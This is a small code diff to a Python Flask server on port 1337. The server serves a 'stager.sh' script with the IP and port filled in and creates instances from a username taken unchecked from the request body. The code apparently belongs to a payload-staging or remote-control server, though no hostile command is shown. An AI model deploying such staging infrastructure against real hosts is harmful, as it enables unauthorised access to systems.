@@ -9,6 +9,7 @@ from core.message import Message
 
 import instance_manager
 
+LOCAL_IP = '127.0.0.1'
 PORT = 1337
 
 app = Flask(__name__)
@@ -68,7 +69,7 @@ def get_resource(resource):
 
     elif resource == 'stager.sh':
         return get_file_with_subs(resource, {
-            'LOCAL_IP': '127.0.0.1',
+            'LOCAL_IP': LOCAL_IP,
             'WEBSERVER_PORT': '1337'
         })
 
@@ -77,7 +78,9 @@ def get_resource(resource):
 
 @app.route('/instances', methods=['POST'])
 def create_instance():
-    instance = instance_manager.create_instance()
+    username = request.data.decode()
+    print(f'created with username {username}')
+    instance = instance_manager.create_instance(username)
     return instance.instance_id
 
 
